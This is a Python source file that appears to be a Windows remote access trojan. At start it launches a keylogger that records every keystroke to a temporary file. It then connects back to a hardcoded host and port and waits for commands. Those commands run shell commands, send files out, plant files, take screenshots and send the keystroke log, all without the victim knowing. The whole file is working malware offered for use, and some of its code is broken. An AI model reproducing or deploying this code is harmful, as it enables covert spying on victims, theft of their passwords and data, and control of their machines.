#!/usr/bin/env python
import os
import socket
import time
import subprocess
import shutil
import random
import winreg as wreg
import tempfile
from PIL import ImageGrab
from pynput.keyboard import Key, Listener
from threading import Thread

_TEMP = tempfile.mkdtemp()

def on_press(key):
        fp = open(_TEMP + '\log.txt','a')
        fp.write(str(key) + '\n')
        fp.close()

def agent():
    with Listener(on_press = on_press) as listener:
        listener.join()

t = Thread(target=agent)
t.start()


def upload(s, arq):
	f = open(arq, 'wb')
	while True:
		bits = s.recv(1024)
		if bits.endswith('DONE'.encode()):
			f.write(bits[:-4])
			f.close()
			f.close()
			break
		f.write(bits)

def transfer(s, path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(1024)
        while len(packet) > 0:
            s.send(packet)
            packet = f.read(1024)
        s.send('DONE'.encode())
    else:
    	 s.send('File not found'.encode())

def connecting():
    s = socket.socket()

    while True:
        try:
            s.connect(("192.168.0.101", 8080))
            break
        except:
            sleep_for = random.randrange(1,10)
            time.sleep(int(sleep_for))

    while True:
        command = s.recv(1024)
        print(command.decode())

        if 'terminate' in command.decode():
            s.close()
            break

        elif 'upload' in command.decode():
            up, arq = command.decode().split('*')
            try:
                upload(s, arq)
            except Exception as e:
                pass

        elif 'grab' in command.decode():
        	grab, path = command.decode().split("*")
        	try:
        		transfer(s, path)
        	except:
        		pass

        elif 'cd' in command.decode():
        	cd, path = command.decode().split('*')
        	try:
        		os.chdir(path)
        		s.send(os.path.abspath('.').encode())
        	except:
        		s.send(('[-] Erro ao tentar acessar o diretorio pelo ' + path).encode())
        		continue

        elif 'print' in command.decode():
            arqpath = tempfile.mkdtemp()
            ImageGrab.grab().save(arqpath + '\img.jpg', 'JPEG')
            transfer(s, arqpath+ '\img.jpg')
            shutil.rmtree(arqpath)

        elif 'dump' in command.decode():
            transfer(s, _TEMP + '\log.txt')

        else:
            # Filtro de comandos
            if 'dir' in command.decode() and not '-v' in command.decode():
                command = command + ' /b'.encode()

            # Execução do comando com retorno
            try:
                CMD = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
                if not CMD.strip():
                    s.send('[-] Nao ha arquivos neste diretorio'.encode())

                s.send(CMD.stderr.read())
                s.send(CMD.stdout.read())
            except:
                pass

def main():
    connecting()

main()
